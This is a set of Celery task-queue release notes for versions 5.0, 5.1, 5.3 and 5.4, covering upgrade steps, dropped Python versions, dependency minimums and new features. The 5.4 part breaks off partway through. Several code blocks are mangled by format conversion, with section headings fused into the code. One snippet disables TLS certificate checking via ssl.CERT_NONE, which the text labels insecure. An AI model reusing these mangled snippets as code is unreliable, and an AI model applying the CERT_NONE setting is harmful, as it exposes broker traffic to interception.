It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is **mostly** backward compatible with previous versions it's important that you read the following section as this release is a new major version.

This version is officially supported on CPython 3.6, 3.7 & 3.8 and is also supported on PyPy3.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

The 5.0.0 release is a new major release for Celery.

Starting from now users should expect more frequent releases of major versions as we move fast and break things to bring you even better experience.

Releases in the 5.x series are codenamed after songs of [Jon Hopkins](https://en.wikipedia.org/wiki/Jon_Hopkins). This release has been codenamed [Singularity](https://www.youtube.com/watch?v=lkvnpHFajt0).

This version drops support for Python 2.7.x which has reached EOL in January 1st, 2020. This allows us, the maintainers to focus on innovating without worrying for backwards compatibility.

From now on we only support Python 3.6 and above. We will maintain compatibility with Python 3.6 until it's EOL in December, 2021.

*— Omer Katz*

### Long Term Support Policy

As we'd like to provide some time for you to transition, we're designating Celery 4.x an LTS release. Celery 4.x will be supported until the 1st of August, 2021.

We will accept and apply patches for bug fixes and security issues. However, no new features will be merged for that version.

Celery 5.x **is not** an LTS release. We will support it until the release of Celery 6.x.

We're in the process of defining our Long Term Support policy. Watch the next "What's New" document for updates.

### Wall of Contributors

Artem Vasilyev \<<artem.v.vasilyev@gmail.com>\> Ash Berlin-Taylor \<<ash_github@firemirror.com>\> Asif Saif Uddin (Auvi) \<<auvipy@gmail.com>\> Asif Saif Uddin \<<auvipy@gmail.com>\> Christian Clauss \<<cclauss@me.com>\> Germain Chazot \<<g.chazot@gmail.com>\> Harry Moreno \<<morenoh149@gmail.com>\> kevinbai \<<kevinbai.cn@gmail.com>\> Martin Paulus \<<mpaulus@lequest.com>\> Matus Valo \<<matusvalo@gmail.com>\> Matus Valo \<<matusvalo@users.noreply.github.com>\> maybe-sybr \<<58414429+maybe-sybr@users.noreply.github.com>\> Omer Katz \<<omer.drow@gmail.com>\> Patrick Cloke \<<clokep@users.noreply.github.com>\> qiaocc \<<jasonqiao36@gmail.com>\> Thomas Grainger \<<tagrain@gmail.com>\> Weiliang Li \<<to.be.impressive@gmail.com>\>

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 4.x

### Step 1: Adjust your command line invocation

Celery 5.0 introduces a new CLI implementation which isn't completely backwards compatible.

The global options can no longer be positioned after the sub-command. Instead, they must be positioned as an option for the <span class="title-ref">celery</span> command like so:

    celery --app path.to.app worker

If you were using our \[daemonizing\](\#daemonizing) guide to deploy Celery in production, you should revisit it for updates.

### Step 2: Update your configuration with the new setting names

If you haven't already updated your configuration when you migrated to Celery 4.0, please do so now.

We elected to extend the deprecation period until 6.0 since we did not loudly warn about using these deprecated settings.

Please refer to the \[migration guide \<conf-old-settings-map\>\](\#migration-guide-\<conf-old-settings-map\>) for instructions.

### Step 3: Read the important notes in this document

Make sure you are not affected by any of the important upgrade notes mentioned in the \[following section \<v500-important\>\](\#following-section-\<v500-important\>).

You should mainly verify that any of the breaking changes in the CLI do not affect you. Please refer to \[New Command Line Interface \<new\_command\_line\_interface\>\](\#new-command-line-interface-\<new\_command\_line\_interface\>) for details.

### Step 4: Migrate your code to Python 3

Celery 5.0 supports only Python 3. Therefore, you must ensure your code is compatible with Python 3.

If you haven't ported your code to Python 3, you must do so before upgrading.

You can use tools like [2to3](https://docs.python.org/3.8/library/2to3.html) and [pyupgrade](https://github.com/asottile/pyupgrade) to assist you with this effort.

After the migration is done, run your test suite with Celery 4 to ensure nothing has been broken.

### Step 5: Upgrade to Celery 5.0

At this point you can upgrade your workers and clients with the new version.

## Important Notes

### Supported Python Versions

The supported Python Versions are:

  - CPython 3.6
  - CPython 3.7
  - CPython 3.8
  - PyPy3.6 7.2 (`pypy3`)

### Dropped support for Python 2.7 & 3.5

Celery now requires Python 3.6 and above.

Python 2.7 has reached EOL in January 2020. In order to focus our efforts we have dropped support for Python 2.7 in this version.

In addition, Python 3.5 has reached EOL in September 2020. Therefore, we are also dropping support for Python 3.5.

If you still require to run Celery using Python 2.7 or Python 3.5 you can still use Celery 4.x. However we encourage you to upgrade to a supported Python version since no further security patches will be applied for Python 2.7 and as mentioned Python 3.5 is not supported for practical reasons.

### Kombu

Starting from this release, the minimum required version is Kombu 5.0.0.

### Billiard

Starting from this release, the minimum required version is Billiard 3.6.3.

### Eventlet Workers Pool

Due to [eventlet/eventlet\#526](https://github.com/eventlet/eventlet/issues/526) the minimum required version is eventlet 0.26.1.

### Gevent Workers Pool

Starting from this release, the minimum required version is gevent 1.0.0.

### Couchbase Result Backend

The Couchbase result backend now uses the V3 Couchbase SDK.

As a result, we no longer support Couchbase Server 5.x.

Also, starting from this release, the minimum required version for the database client is couchbase 3.0.0.

To verify that your Couchbase Server is compatible with the V3 SDK, please refer to their [documentation](https://docs.couchbase.com/python-sdk/3.0/project-docs/compatibility.html).

### Riak Result Backend

The Riak result backend has been removed as the database is no longer maintained.

The Python client only supports Python 3.6 and below which prevents us from supporting it and it is also unmaintained.

If you are still using Riak, refrain from upgrading to Celery 5.0 while you migrate your application to a different database.

We apologize for the lack of notice in advance but we feel that the chance you'll be affected by this breaking change is minimal which is why we did it.

### AMQP Result Backend

The AMQP result backend has been removed as it was deprecated in version 4.0.

### Removed Deprecated Modules

The <span class="title-ref">celery.utils.encoding</span> and the <span class="title-ref">celery.task</span> modules has been deprecated in version 4.0 and therefore are removed in 5.0.

If you were using the <span class="title-ref">celery.utils.encoding</span> module before, you should import <span class="title-ref">kombu.utils.encoding</span> instead.

If you were using the <span class="title-ref">celery.task</span> module before, you should import directly from the <span class="title-ref">celery</span> module instead.

If you were using <span class="title-ref">from celery.task import Task</span> you should use <span class="title-ref">from celery import Task</span> instead.

If you were using the <span class="title-ref">celery.task</span> decorator you should use <span class="title-ref">celery.shared\_task</span> instead.

### New Command Line Interface

The command line interface has been revamped using Click. As a result a few breaking changes has been introduced:

  - Postfix global options like <span class="title-ref">celery worker --app path.to.app</span> or <span class="title-ref">celery worker --workdir /path/to/workdir</span> are no longer supported. You should specify them as part of the global options of the main celery command.
  - `celery amqp` and `celery shell` require the <span class="title-ref">repl</span> sub command to start a shell. You can now also invoke specific commands without a shell. Type <span class="title-ref">celery amqp --help</span> or <span class="title-ref">celery shell --help</span> for details.
  - The API for adding user options has changed. Refer to the \[documentation \<extending-command-options\>\](\#documentation-\<extending-command-options\>) for details.

Click provides shell completion [out of the box](https://click.palletsprojects.com/en/7.x/bashcomplete/). This functionality replaces our previous bash completion script and adds completion support for the zsh and fish shells.

The bash completion script was exported to [extras/celery.bash](https://github.com/celery/celery/blob/master/extra/bash-completion/celery.bash) for the packager's convenience.

### Pytest Integration

Starting from Celery 5.0, the pytest plugin is no longer enabled by default.

Please refer to the \[documentation \<pytest\_plugin\>\](\#documentation-\<pytest\_plugin\>) for instructions.

### Ordered Group Results for the Redis Result Backend

Previously group results were not ordered by their invocation order. Celery 4.4.7 introduced an opt-in feature to make them ordered.

It is now an opt-out behavior.

If you were previously using the Redis result backend, you might need to opt-out of this behavior.

Please refer to the \[documentation \<redis-group-result-ordering\>\](\#documentation-\<redis-group-result-ordering\>) for instructions on how to disable this feature.

## News

### Retry Policy for the Redis Result Backend

The retry policy for the Redis result backend is now exposed through the result backend transport options.

Please refer to the \[documentation \<redis-result-backend-timeout\>\](\#documentation-\<redis-result-backend-timeout\>) for details.

---

whatsnew-5.1.md

---

# What's new in Celery 5.1 (Sun Harmonics)

  - Author  
    Josue Balandrano Coronel (`jbc at rmcomplexity.com`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed programming framework to process vast amounts of messages, while providing operations with the tools required to maintain a distributed system with python.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is **mostly** backward compatible with previous versions it's important that you read the following section as this release is a new major version.

This version is officially supported on CPython 3.6, 3.7 & 3.8 & 3.9 and is also supported on PyPy3.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

The 5.1.0 release is a new minor release for Celery.

Starting from now users should expect more frequent releases of major versions as we move fast and break things to bring you even better experience.

Releases in the 5.x series are codenamed after songs of [Jon Hopkins](https://en.wikipedia.org/wiki/Jon_Hopkins). This release has been codenamed [Sun Harmonics](https://www.youtube.com/watch?v=pCwjSoBm_pI).

From now on we only support Python 3.6 and above. We will maintain compatibility with Python 3.6 until it's EOL in December, 2021.

*— Omer Katz*

### Long Term Support Policy

As we'd like to provide some time for you to transition, we're designating Celery 4.x an LTS release. Celery 4.x will be supported until the 1st of August, 2021.

We will accept and apply patches for bug fixes and security issues. However, no new features will be merged for that version.

Celery 5.x **is not** an LTS release. We will support it until the release of Celery 6.x.

We're in the process of defining our Long Term Support policy. Watch the next "What's New" document for updates.

### Wall of Contributors

0xflotus \<<0xflotus@gmail.com>\> AbdealiJK \<<abdealikothari@gmail.com>\> Anatoliy \<<apeks37@yandex.ru>\> Anna Borzenko \<<aaa-nn-a@mail.ru>\> aruseni \<<aruseni.magiku@gmail.com>\> Asif Saif Uddin (Auvi) \<<auvipy@gmail.com>\> Asif Saif Uddin \<<auvipy@gmail.com>\> Awais Qureshi \<<awais.qureshi@arbisoft.com>\> careljonkhout \<<carel.jonkhout@gmail.com>\> Christian Clauss \<<cclauss@me.com>\> danthegoodman1 \<<xxdanthegoodmanxx@gmail.com>\> Dave Johansen \<<davejohansen@gmail.com>\> David Schneider \<<schneidav81@gmail.com>\> Fahmi \<<fahmimodelo@gmail.com>\> Felix Yan \<<felixonmars@archlinux.org>\> Gabriel Augendre \<<gabriel@augendre.info>\> galcohen \<<gal.cohen@autodesk.com>\> gal cohen \<<gal.nevis@gmail.com>\> Geunsik Lim \<<leemgs@gmail.com>\> Guillaume DE SUSANNE D'EPINAY \<<guillaume.desusanne@ssi.gouv.fr>\> Hilmar Hilmarsson \<<hilmarh@gmail.com>\> Illia Volochii \<<illia.volochii@gmail.com>\> jenhaoyang \<<randy19962@gmail.com>\> Jonathan Stoppani \<<jonathan@stoppani.name>\> Josue Balandrano Coronel \<<jbc@rmcomplexity.com>\> kosarchuksn \<<sergeykosarchuk@gmail.com>\> Kostya Deev \<<kostya.deev@bluware.com>\> Matt Hoffman \<<mjhoffman65@gmail.com>\> Matus Valo \<<matusvalo@gmail.com>\> Myeongseok Seo \<<clichedmoog@gmail.com>\> Noam \<<noamkush@gmail.com>\> Omer Katz \<<omer.drow@gmail.com>\> pavlos kallis \<<pakallis@gmail.com>\> Pavol Plaskoň \<<pavol.plaskon@gmail.com>\> Pengjie Song (宋鹏捷) \<<spengjie@sina.com>\> Sardorbek Imomaliev \<<sardorbek.imomaliev@gmail.com>\> Sergey Lyapustin \<<s.lyapustin@gmail.com>\> Sergey Tikhonov \<<zimbler@gmail.com>\> Stephen J. Fuhry \<<steve@tpastream.com>\> Swen Kooij \<<swen@sectorlabs.ro>\> tned73 \<<edwin@tranzer.com>\> Tomas Hrnciar \<<thrnciar@redhat.com>\> tumb1er \<<zimbler@gmail.com>\>

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 4.x

### Step 1: Adjust your command line invocation

Celery 5.0 introduces a new CLI implementation which isn't completely backwards compatible.

The global options can no longer be positioned after the sub-command. Instead, they must be positioned as an option for the <span class="title-ref">celery</span> command like so:

    celery --app path.to.app worker

If you were using our \[daemonizing\](\#daemonizing) guide to deploy Celery in production, you should revisit it for updates.

### Step 2: Update your configuration with the new setting names

If you haven't already updated your configuration when you migrated to Celery 4.0, please do so now.

We elected to extend the deprecation period until 6.0 since we did not loudly warn about using these deprecated settings.

Please refer to the \[migration guide \<conf-old-settings-map\>\](\#migration-guide-\<conf-old-settings-map\>) for instructions.

### Step 3: Read the important notes in this document

Make sure you are not affected by any of the important upgrade notes mentioned in the \[following section \<v500-important\>\](\#following-section-\<v500-important\>).

You should verify that none of the breaking changes in the CLI do not affect you. Please refer to \[New Command Line Interface \<new\_command\_line\_interface\>\](\#new-command-line-interface-\<new\_command\_line\_interface\>) for details.

### Step 4: Migrate your code to Python 3

Celery 5.x only supports Python 3. Therefore, you must ensure your code is compatible with Python 3.

If you haven't ported your code to Python 3, you must do so before upgrading.

You can use tools like [2to3](https://docs.python.org/3.8/library/2to3.html) and [pyupgrade](https://github.com/asottile/pyupgrade) to assist you with this effort.

After the migration is done, run your test suite with Celery 4 to ensure nothing has been broken.

### Step 5: Upgrade to Celery 5.1

At this point you can upgrade your workers and clients with the new version.

## Important Notes

### Supported Python Versions

The supported Python Versions are:

  - CPython 3.6
  - CPython 3.7
  - CPython 3.8
  - CPython 3.9
  - PyPy3.6 7.2 (`pypy3`)

### Important Notes

#### Kombu

Starting from v5.1, the minimum required version is Kombu 5.1.0.

#### Py-AMQP

Starting from Celery 5.1, py-amqp will always validate certificates received from the server and it is no longer required to manually set `cert_reqs` to `ssl.CERT_REQUIRED`.

The previous default, `ssl.CERT_NONE` is insecure and we its usage should be discouraged. If you'd like to revert to the previous insecure default set `cert_reqs` to `ssl.CERT_NONE`

`` `python     import ssl      broker_use_ssl = {       'keyfile': '/var/ssl/private/worker-key.pem',       'certfile': '/var/ssl/amqp-server-cert.pem',       'ca_certs': '/var/ssl/myca.pem',       'cert_reqs': ssl.CERT_NONE     }  Billiard ``\` \~\~\~\~\~\~\~\~

Starting from v5.1, the minimum required version is Billiard 3.6.4.

### Important Notes From 5.0

#### Dropped support for Python 2.7 & 3.5

Celery now requires Python 3.6 and above.

Python 2.7 has reached EOL in January 2020. In order to focus our efforts we have dropped support for Python 2.7 in this version.

In addition, Python 3.5 has reached EOL in September 2020. Therefore, we are also dropping support for Python 3.5.

If you still require to run Celery using Python 2.7 or Python 3.5 you can still use Celery 4.x. However we encourage you to upgrade to a supported Python version since no further security patches will be applied for Python 2.7 or Python 3.5.

#### Eventlet Workers Pool

Due to [eventlet/eventlet\#526](https://github.com/eventlet/eventlet/issues/526) the minimum required version is eventlet 0.26.1.

#### Gevent Workers Pool

Starting from v5.0, the minimum required version is gevent 1.0.0.

#### Couchbase Result Backend

The Couchbase result backend now uses the V3 Couchbase SDK.

As a result, we no longer support Couchbase Server 5.x.

Also, starting from v5.0, the minimum required version for the database client is couchbase 3.0.0.

To verify that your Couchbase Server is compatible with the V3 SDK, please refer to their [documentation](https://docs.couchbase.com/python-sdk/3.0/project-docs/compatibility.html).

#### Riak Result Backend

The Riak result backend has been removed as the database is no longer maintained.

The Python client only supports Python 3.6 and below which prevents us from supporting it and it is also unmaintained.

If you are still using Riak, refrain from upgrading to Celery 5.0 while you migrate your application to a different database.

We apologize for the lack of notice in advance but we feel that the chance you'll be affected by this breaking change is minimal which is why we did it.

#### AMQP Result Backend

The AMQP result backend has been removed as it was deprecated in version 4.0.

#### Removed Deprecated Modules

The <span class="title-ref">celery.utils.encoding</span> and the <span class="title-ref">celery.task</span> modules has been deprecated in version 4.0 and therefore are removed in 5.0.

If you were using the <span class="title-ref">celery.utils.encoding</span> module before, you should import <span class="title-ref">kombu.utils.encoding</span> instead.

If you were using the <span class="title-ref">celery.task</span> module before, you should import directly from the <span class="title-ref">celery</span> module instead.

If you were using <span class="title-ref">from celery.task import Task</span> you should use <span class="title-ref">from celery import Task</span> instead.

If you were using the <span class="title-ref">celery.task</span> decorator you should use <span class="title-ref">celery.shared\_task</span> instead.

### <span class="title-ref">azure-servicebus</span> 7.0.0 is now required

Given the SDK changes between 0.50.0 and 7.0.0 Kombu deprecates support for older <span class="title-ref">azure-servicebus</span> versions.

## News

### Support for Azure Service Bus 7.0.0

With Kombu v5.1.0 we now support Azure Services Bus.

Azure have completely changed the Azure ServiceBus SDK between 0.50.0 and 7.0.0. <span class="title-ref">azure-servicebus \>= 7.0.0</span> is now required for Kombu <span class="title-ref">5.1.0</span>

### Add support for SQLAlchemy 1.4

Following the changes in SQLAlchemy 1.4, the declarative base is no longer an extension. Importing it from sqlalchemy.ext.declarative is deprecated and will be removed in SQLAlchemy 2.0.

### Support for Redis username authentication

Previously, the username was ignored from the URI. Starting from Redis\>=6.0, that shouldn't be the case since ACL support has landed.

Please refer to the \[documentation \<conf-redis-result-backend\>\](\#documentation-\<conf-redis-result-backend\>) for details.

### SQS transport - support back off policy

SQS now supports managed visibility timeout. This lets us implement a back off policy (for instance, an exponential policy) which means that the time between task failures will dynamically change based on the number of retries.

Documentation: \[kombu:reference/kombu.transport.SQS\](kombu:reference/kombu.transport.SQS.md)

### Duplicate successful tasks

The trace function fetches the metadata from the backend each time it receives a task and compares its state. If the state is SUCCESS, we log and bail instead of executing the task. The task is acknowledged and everything proceeds normally.

Documentation: `worker_deduplicate_successful_tasks`

### Terminate tasks with late acknowledgment on connection loss

Tasks with late acknowledgement keep running after restart, although the connection is lost and they cannot be acknowledged anymore. These tasks will now be terminated.

Documentation: `worker_cancel_long_running_tasks_on_connection_loss`

### <span class="title-ref">task.apply\_async(ignore\_result=True)</span> now avoids persisting the result

<span class="title-ref">task.apply\_async</span> now supports passing <span class="title-ref">ignore\_result</span> which will act the same as using `@app.task(ignore_result=True)`.

### Use a thread-safe implementation of <span class="title-ref">cached\_property</span>

<span class="title-ref">cached\_property</span> is heavily used in celery but it is causing issues in multi-threaded code since it is not thread safe. Celery is now using a thread-safe implementation of <span class="title-ref">cached\_property</span>.

### Tasks can now have required kwargs at any order

Tasks can now be defined like this:

`` `python     from celery import shared_task      @shared_task     def my_func(*, name='default', age, city='Kyiv'):         pass   SQS - support STS authentication with AWS ``\` -----------------------------------------

The STS token requires a refresh after a certain period of time. After <span class="title-ref">sts\_token\_timeout</span> is reached, a new token will be created.

Documentation: \[/getting-started/backends-and-brokers/sqs\](/getting-started/backends-and-brokers/sqs.md)

### Support Redis <span class="title-ref">health\_check\_interval</span>

<span class="title-ref">health\_check\_interval</span> can be configured and will be passed to <span class="title-ref">redis-py</span>.

Documentation: `redis_backend_health_check_interval`

### Update default pickle protocol version to 4

The pickle protocol version was updated to allow Celery to serialize larger strings among other benefits.

See: <https://docs.python.org/3.9/library/pickle.html#data-stream-format>

### Support Redis Sentinel with SSL

See documentation for more info: \[/getting-started/backends-and-brokers/redis\](/getting-started/backends-and-brokers/redis.md)

---

whatsnew-5.3.md

---

# What's new in Celery 5.3 (Emerald Rush)

  - Author  
    Asif Saif Uddin (`auvipy at gmail.com`).

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed programming framework to process vast amounts of messages, while providing operations with the tools required to maintain a distributed system with python.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

\> **Note** \> Following the problems with Freenode, we migrated our IRC channel to Libera Chat as most projects did. You can also join us using [Gitter](https://gitter.im/celery/celery).

> We're sometimes there to answer questions. We welcome you to join.

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is **mostly** backward compatible with previous versions it's important that you read the following section as this release is a new major version.

This version is officially supported on CPython 3.8, 3.9 & 3.10 and is also supported on PyPy3.8+.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

\> **Note** \> **This release contains fixes for many long standing bugs & stability issues. We encourage our users to upgrade to this release as soon as possible.**

The 5.3.0 release is a new feature release for Celery.

Releases in the 5.x series are codenamed after songs of [Jon Hopkins](https://en.wikipedia.org/wiki/Jon_Hopkins). This release has been codenamed [Emerald Rush](https://www.youtube.com/watch?v=4sk0uDbM5lc).

From now on we only support Python 3.8 and above. We will maintain compatibility with Python 3.8 until it's EOL in 2024.

*— Asif Saif Uddin*

### Long Term Support Policy

We no longer support Celery 4.x as we don't have the resources to do so. If you'd like to help us, all contributions are welcome.

Celery 5.x **is not** an LTS release. We will support it until the release of Celery 6.x.

We're in the process of defining our Long Term Support policy. Watch the next "What's New" document for updates.

### Wall of Contributors

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 4.x

### Step 1: Adjust your command line invocation

Celery 5.0 introduces a new CLI implementation which isn't completely backwards compatible.

The global options can no longer be positioned after the sub-command. Instead, they must be positioned as an option for the <span class="title-ref">celery</span> command like so:

    celery --app path.to.app worker

If you were using our \[daemonizing\](\#daemonizing) guide to deploy Celery in production, you should revisit it for updates.

### Step 2: Update your configuration with the new setting names

If you haven't already updated your configuration when you migrated to Celery 4.0, please do so now.

We elected to extend the deprecation period until 6.0 since we did not loudly warn about using these deprecated settings.

Please refer to the \[migration guide \<conf-old-settings-map\>\](\#migration-guide-\<conf-old-settings-map\>) for instructions.

### Step 3: Read the important notes in this document

Make sure you are not affected by any of the important upgrade notes mentioned in the \[following section \<v500-important\>\](\#following-section-\<v500-important\>).

You should verify that none of the breaking changes in the CLI do not affect you. Please refer to \[New Command Line Interface \<new\_command\_line\_interface\>\](\#new-command-line-interface-\<new\_command\_line\_interface\>) for details.

### Step 4: Migrate your code to Python 3

Celery 5.x only supports Python 3. Therefore, you must ensure your code is compatible with Python 3.

If you haven't ported your code to Python 3, you must do so before upgrading.

You can use tools like [2to3](https://docs.python.org/3.8/library/2to3.html) and [pyupgrade](https://github.com/asottile/pyupgrade) to assist you with this effort.

After the migration is done, run your test suite with Celery 4 to ensure nothing has been broken.

### Step 5: Upgrade to Celery 5.3

At this point you can upgrade your workers and clients with the new version.

## Important Notes

### Supported Python Versions

The supported Python versions are:

  - CPython 3.8
  - CPython 3.9
  - CPython 3.10
  - PyPy3.8 7.3.11 (`pypy3`)

#### Experimental support

Celery supports these Python versions provisionally as they are not production ready yet:

  - CPython 3.11

### Quality Improvements and Stability Enhancements

Celery 5.3 focuses on elevating the overall quality and stability of the project. We have dedicated significant efforts to address various bugs, enhance performance, and make improvements based on valuable user feedback.

### Better Compatibility and Upgrade Confidence

Our goal with Celery 5.3 is to instill confidence in users who are currently using Celery 4 or older versions. We want to assure you that upgrading to Celery 5.3 will provide a more robust and reliable experience.

### Dropped support for Python 3.7

Celery now requires Python 3.8 and above.

Python 3.7 will reach EOL in June, 2023. In order to focus our efforts we have dropped support for Python 3.6 in this version.

If you still require to run Celery using Python 3.7 you can still use Celery 5.2. However we encourage you to upgrade to a supported Python version since no further security patches will be applied for Python 3.7 after the 23th of June, 2023.

### Automatic re-connection on connection loss to broker

Unless `broker_connection_retry_on_startup` is set to False, Celery will automatically retry reconnecting to the broker after the first connection loss. `broker_connection_retry` controls whether to automatically retry reconnecting to the broker for subsequent reconnects.

Since the message broker does not track how many tasks were already fetched before the connection was lost, Celery will reduce the prefetch count by the number of tasks that are currently running multiplied by `worker_prefetch_multiplier`. The prefetch count will be gradually restored to the maximum allowed after each time a task that was running before the connection was lost is complete

### Kombu

Starting from v5.3.0, the minimum required version is Kombu 5.3.0.

### Redis

redis-py 4.5.x is the new minimum required version.

### SQLAlchemy

SQLAlchemy 1.4.x & 2.0.x is now supported in celery v5.3

### Billiard

Minimum required version is now 4.1.0

### Deprecate pytz and use zoneinfo

A switch have been made to zoneinfo for handling timezone data instead of pytz.

#### Support for out-of-tree worker pool implementations

Prior to version 5.3, Celery had a fixed notion of the worker pool types it supports. Celery v5.3.0 introduces the the possibility of an out-of-tree worker pool implementation. This feature ensure that the current worker pool implementations consistently call into BasePool.\_get\_info(), and enhance it to report the work pool class in use via the "celery inspect stats" command. For example:

$ celery -A ... inspect stats -\> <celery@freenas>: OK { ... "pool": { ... "implementation": "celery\_aio\_pool.pool:AsyncIOPool",

It can be used as follows:

> Set the environment variable CELERY\_CUSTOM\_WORKER\_POOL to the name of an implementation of :class:celery.concurrency.base.BasePool in the standard Celery format of "package:class".
> 
> Select this pool using '--pool custom'.

### Signal::`worker_before_create_process`

Dispatched in the parent process, just before new child process is created in the prefork pool. It can be used to clean up instances that don't behave well when forking.

`` `python     @signals.worker_before_create_process.connect     def clean_channels(**kwargs):         grpc_singleton.clean_channel()   Setting:: ``beat\_cron\_starting\_deadline`  `\` ----------------------------------------

When using cron, the number of seconds `~celery.bin.beat` can look back when deciding whether a cron schedule is due. When set to <span class="title-ref">None</span>, cronjobs that are past due will always run immediately.

### Redis result backend Global keyprefix

The global key prefix will be prepended to all keys used for the result backend, which can be useful when a redis database is shared by different users. By default, no prefix is prepended.

To configure the global keyprefix for the Redis result backend, use the `global_keyprefix` key under `result_backend_transport_options`:

`` `python     app.conf.result_backend_transport_options = {         'global_keyprefix': 'my_prefix_'     }   Django ``\` ------

Minimum django version is bumped to v2.2.28. Also added --skip-checks flag to bypass django core checks.

### Make default worker state limits configurable

Previously, <span class="title-ref">REVOKES\_MAX</span>, <span class="title-ref">REVOKE\_EXPIRES</span>, <span class="title-ref">SUCCESSFUL\_MAX</span> and <span class="title-ref">SUCCESSFUL\_EXPIRES</span> were hardcoded in <span class="title-ref">celery.worker.state</span>. This version introduces <span class="title-ref">CELERY\_WORKER\_</span> prefixed environment variables with the same names that allow you to customize these values should you need to.

### Canvas stamping

The goal of the Stamping API is to give an ability to label the signature and its components for debugging information purposes. For example, when the canvas is a complex structure, it may be necessary to label some or all elements of the formed structure. The complexity increases even more when nested groups are rolled-out or chain elements are replaced. In such cases, it may be necessary to understand which group an element is a part of or on what nested level it is. This requires a mechanism that traverses the canvas elements and marks them with specific metadata. The stamping API allows doing that based on the Visitor pattern.

### Known Issues

Canvas header stamping has issues in a hybrid Celery 4.x. & Celery 5.3.x environment and is not safe for production use at the moment.

---

whatsnew-5.4.md

---

# What's new in Celery 5.4 (Opalescent)

  - Author  
    Tomer Nosrati (`tomer.nosrati at gmail.com`).

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed programming framework to process vast amounts of messages, while providing operations with the tools required to maintain a distributed system with python.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

\> **Note** \> Following the problems with Freenode, we migrated our IRC channel to Libera Chat as most projects did. You can also join us using [Gitter](https://gitter.im/celery/celery).

> We're sometimes there to answer questions. We welcome you to join.

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is **mostly** backward compatible with previous versions it's important that you read the following section as this release is a new major version.

This version is officially supported on CPython 3.8, 3.9 & 3.10 and is also supported on PyPy3.8+.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

\> **Note** \> **This release contains fixes for many long standing bugs & stability issues. We encourage our users to upgrade to this release as soon as possible.**

The 5.4.0 release is a new feature release for Celery.

Releases in the 5.x series are codenamed after songs of [Jon Hopkins](https://en.wikipedia.org/wiki/Jon_Hopkins). This release has been codenamed [Opalescent](https://www.youtube.com/watch?v=9ByfK25WsMM).

From now on we only support Python 3.8 and above. We will maintain compatibility with Python 3.8 until it's EOL in 2024.

*— Tomer Nosrati*

### Long Term Support Policy

We no longer support Celery 4.x as we don't have the resources to do so. If you'd like to help us, all contributions are welcome.

Celery 5.x **is not** an LTS release. We will support it until the release of Celery 6.x.

We're in the process of defining our Long Term Support policy. Watch the next "What's New" document for updates.

### Wall of Contributors

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 4.x

### Step 1: Adjust your command line invocation

Celery 5.0 introduces a new CLI implementation which isn't completely backwards compatible.

The global options can no longer be positioned after the sub-command. Instead, they must be positioned as an option for the <span class="title-ref">celery</span> command like so:

    celery --app path.to.app worker

If you were using our \[daemonizing\](\#daemonizing) guide to deploy Celery in production, you should revisit it for updates.

### Step 2: Update your configuration with the new setting names

If you haven't already updated your configuration when you migrated to Celery 4.0, please do so now.

We elected to extend the deprecation period until 6.0 since we did not loudly warn about using these deprecated settings.

Please refer to the \[migration guide \<conf-old-settings-map\>\](\#migration-guide-\<conf-old-settings-map\>) for instructions.

### Step 3: Read the important notes in this document

Make sure you are not affected by any of the important upgrade notes mentioned in the \[following section \<v500-important\>\](\#following-section-\<v500-important\>).

You should verify that none of the breaking changes in the CLI do not affect you. Please refer to \[New Command Line Interface \<new\_command\_line\_interface\>\](\#new-command-line-interface-\<new\_command\_line\_interface\>) for details.

### Step 4: Migrate your code to Python 3

Celery 5.x only supports Python 3. Therefore, you must ensure your code is compatible with Python 3.

If you haven't ported your code to Python 3, you must do so before upgrading.

